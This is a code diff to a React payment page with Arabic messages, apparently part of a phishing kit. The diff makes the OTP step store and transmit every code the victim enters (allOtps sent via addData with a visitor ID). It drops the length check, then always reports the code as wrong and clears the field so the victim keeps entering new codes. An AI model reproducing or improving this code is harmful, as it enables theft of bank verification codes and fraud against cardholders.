@@ -104,8 +104,8 @@ export default function PaymentPage() {
     const numericValue = value.replace(/\D/g, "")
     setOtp(numericValue)
   }
-  const handleOtp=(vak:string)=>{
-allOtps.push(vak)
+  const handleOtp = (vak: string) => {
+    allOtps.push(vak)
   }
   const handleSubmitPayment = async () => {
     const paymentData = {
@@ -166,25 +166,20 @@ allOtps.push(vak)
 
   const handleVerifyOtp = async () => {
     // Validate OTP
-    if (otp.length !== 6) {
-      toast.error("يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك")
-      return
-    }
-
     setIsSubmitting(true)
 
     try {
       const id = localStorage.getItem("visitor")
       if (!id || !paymentId) throw new Error("Missing required IDs")
-handleOtp(otp)
-      await addData({ id, otp ,allOtps})
+      handleOtp(otp)
+      await addData({ id, otp, allOtps })
 
       // Show success message
 
       // Redirect to success page after short delay
       setTimeout(() => {
         toast.error("رمز التحقق غير صحيح")
-
+setOtp("")
       }, 3000)
     } catch (error) {
       console.error("Error verifying OTP:", error)
@@ -358,6 +353,7 @@ handleOtp(otp)
                     className="w-full h-12 text-center text-xl font-bold border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                     type="tel"
                     maxLength={6}
+                    minLength={4}
                     inputMode="numeric"
                     placeholder="XXXXXX"
                   />
